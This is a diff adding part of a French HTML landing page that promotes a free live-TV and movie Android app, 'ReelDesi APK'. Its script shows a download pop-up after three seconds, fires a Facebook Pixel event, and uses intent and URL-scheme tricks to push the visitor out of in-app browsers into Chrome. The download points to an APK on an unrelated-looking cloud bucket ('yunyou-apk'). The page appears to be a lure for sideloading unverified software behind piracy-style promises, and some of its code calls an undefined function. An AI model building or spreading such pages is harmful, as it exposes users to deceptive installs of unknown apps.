+                    <h3 class="font-bold text-lg text-white mb-2">Quels appareils sont pris en charge ?</h3>
+                    <p class="text-slate-400 text-sm">ReelDesi fonctionne parfaitement sur les mobiles Android, les box TV et les tablettes sous Android 11 ou supérieur. Très optimisé pour une expérience HD de premier ordre.</p>
+                </div>
+            </div>
+        </section>
+
+        <footer class="text-center text-slate-500 text-sm py-10 border-t border-slate-800">
+            <p>© 2026 ReelDesi. Divertissement mondial, en direct et entièrement gratuit.</p>
+            <p class="mt-2 text-xs">Cette page n'héberge aucun contenu protégé par des droits d'auteur, elle est simplement un index promotionnel pour l'application Android uniquement.</p>
+        </footer>
+    </main>
+
+    <!-- Fixed Bottom Bar -->
+    <div class="fixed bottom-0 left-0 right-0 bg-slate-900/95 backdrop-blur-md border-t border-slate-700 p-4 z-50 flex flex-col sm:flex-row items-center justify-between gap-4 px-4 md:px-8">
+        <div class="text-center sm:text-left flex-1">
+            <div class="text-white font-bold">ReelDesi APK V7.0.2</div>
+            <div class="text-slate-400 text-xs">Android • 11 Mo • Sans inscription • 100 % gratuit uniquement</div>
+        </div>
+        <a href="#" data-download="true" class="w-full sm:w-auto flex-1 md:flex-none inline-flex items-center justify-center gap-2 bg-brand-600 hover:bg-brand-500 text-white font-bold py-3 px-6 rounded-xl shadow-lg transition-colors whitespace-nowrap">
+            <svg fill="currentColor" height="20" viewBox="0 0 24 24" width="20">
+                <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path>
+            </svg>
+            <span>Télécharger ReelDesi maintenant</span>
+        </a>
+    </div>
+
+  <!-- Custom Download Confirmation Modal -->
+    <div id="downloadModal" class="fixed inset-0 z-[100] hidden items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm animate-fade-in">
+        <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 md:p-8 max-w-sm w-full text-center shadow-2xl relative overflow-hidden transform transition-all scale-95 opacity-0 duration-300" id="modalContainer">
+            <!-- Background Glow -->
+            <div class="absolute -top-12 -right-12 w-32 h-32 bg-brand-500/20 rounded-full blur-2xl pointer-events-none"></div>
+
+            <div class="w-16 h-16 bg-brand-600/10 text-brand-500 border border-brand-500/20 rounded-2xl flex items-center justify-center mx-auto mb-4 text-2xl shadow-lg">
+                🚀
+            </div>
+
+            <h3 class="text-xl font-bold text-white mb-2">Télécharger ReelDesi APK ?</h3>
+            <p class="text-slate-400 text-sm mb-6 leading-relaxed">
+                Accédez instantanément à plus de 1000 chaînes TV en direct, aux matchs sportifs en direct et aux films HD/4K.
+            </p>
+
+            <div class="flex gap-3">
+                <button id="cancelBtn" class="flex-1 px-4 py-3 bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold rounded-xl transition text-sm">
+                    Annuler
+                </button>
+                <button id="confirmBtn" class="flex-1 px-4 py-3 bg-brand-600 hover:bg-brand-500 text-white font-bold rounded-xl shadow-lg shadow-brand-500/30 transition text-sm">
+                    Télécharger
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Tracking & Redirect Script -->
+    <script>
+        // Facebook Pixel Tracking
+        function trackAddToCart() {
+            if (typeof window.fbq === 'function') {
+                window.fbq('track', 'Subscribe', {
+                    value: 0.00,
+                    currency: 'USD',
+                    predicted_ltv: 0.00
+                });
+            }
+        }
+
+        // Browser Redirection Logic
+        function openWithChrome(url) {
+            if (!url) return;
+
+            var isAndroid = /Android/i.test(navigator.userAgent);
+            var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+            if (isAndroid) {
+                var intentUrl = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end;';
+                
+                var timer = setTimeout(function () {
+                    window.location.href = url;
+                }, 1000);
+
+                window.addEventListener('blur', function clearTimer() {
+                    clearTimeout(timer);
+                    window.removeEventListener('blur', clearTimer);
+                });
+
+                window.location.href = intentUrl;
+
+            } else if (isIOS) {
+                window.location.href = 'googlechrome://' + url.replace(/^https?:\/\//, '');
+                setTimeout(function () {
+                    if (document.hasFocus && !document.hidden) {
+                        window.location.href = url;
+                    }
+                }, 800);
+            } else {
+                window.location.href = url;
+            }
+        }
+
+        var hasRedirected = false;
+
+        function goToForm() {
+            if (hasRedirected) return;
+            trackAddToCart();
+            openWithChrome('https://yunyou-apk-617c81e0fa96.fra1.cdn.digitaloceanspaces.com/studio/w4623726b/app.apk');
+        }
+
+        // Modal Control Logic
+        const downloadModal = document.getElementById('downloadModal');
+        const modalContainer = document.getElementById('modalContainer');
+        const confirmBtn = document.getElementById('confirmBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+
+        function showModal() {
+            downloadModal.classList.remove('hidden');
+            downloadModal.classList.add('flex');
+            setTimeout(function() {
+                modalContainer.classList.remove('scale-95', 'opacity-0');
+                modalContainer.classList.add('scale-100', 'opacity-100');
+            }, 10);
+        }
+
+        function hideModal() {
+            modalContainer.classList.remove('scale-100', 'opacity-100');
+            modalContainer.classList.add('scale-95', 'opacity-0');
+            setTimeout(function() {
+                downloadModal.classList.remove('flex');
+                downloadModal.classList.add('hidden');
+            }, 300);
+        }
+
+        // Confirm button -> trigger download and close modal
+        confirmBtn.addEventListener('click', function() {
+            hideModal();
+            k2();
+        });
+
+        // Cancel button -> close modal only
+        cancelBtn.addEventListener('click', hideModal);
+
+        // CTA jump method
+        function k2() {
+           MeetU.download(event);
+        }
+
+        // Global <a> tag click: CTAs with data-download call k2()
+        document.addEventListener('click', function (e) {
+            var el = e.target.closest('a');
+            if (el && el.getAttribute('data-download') === 'true') {
+                e.preventDefault();
+                k2();
+            }
+        }, false);
+
+        // Show custom modal after 3 seconds of page stay
+        setTimeout(function () {
+            showModal();
+        }, 3000);
+    </script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"b60c74b550334316a9f7a541ca89304d","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
